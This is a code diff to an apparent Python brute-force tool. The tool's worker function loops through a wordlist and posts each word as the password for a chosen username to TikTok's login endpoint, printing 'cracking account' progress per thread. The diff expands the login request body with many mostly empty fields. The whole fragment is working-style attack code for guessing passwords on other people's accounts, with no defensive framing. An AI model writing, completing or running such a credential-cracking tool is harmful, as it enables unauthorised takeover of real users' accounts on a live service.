@@ -82,11 +82,34 @@ def brute_force_worker(user, current_wordlist, start_point, index):
                 print(adv, f"Thread {index} cracking account...", f"{i + 1}/{len(words)}", reset)
             try:
                 response = requests.post('https://www.tiktok.com/node/login_v2/index', json={
-                    "username": user,
-                    "password": word,
-                    "mix_mode": True,
-                    "captcha": "",
-                    # ... (rest of the payload)
+                   "username": user,
+                   "password": word,
+                   "mix_mode": True,
+                   "captcha": "",
+                   "email": "",
+                   "mobile": "",
+                   "account": "",
+                   "type": 1,
+                   "app_id": 1233,
+                   "device_id": "",
+                   "iid": "",
+                   "os_version": "",
+                   "channel": "",
+                   "device_platform": "",
+                   "request_id": "",
+                   "captcha_app": "",
+                   "captcha_type": "",
+                   "google_account": "",
+                   "google_captcha": "",
+                   "google_token": "",
+                   "fb_account": "",
+                   "fb_code": "",
+                   "fb_token": "",
+                   "apple_id": "",
+                   "apple_token": "",
+                   "apple_email": "",
+                   "apple_code": "",
+                   "mix_string": word
                 })
                 if response.status_code == 200:
                     password = word
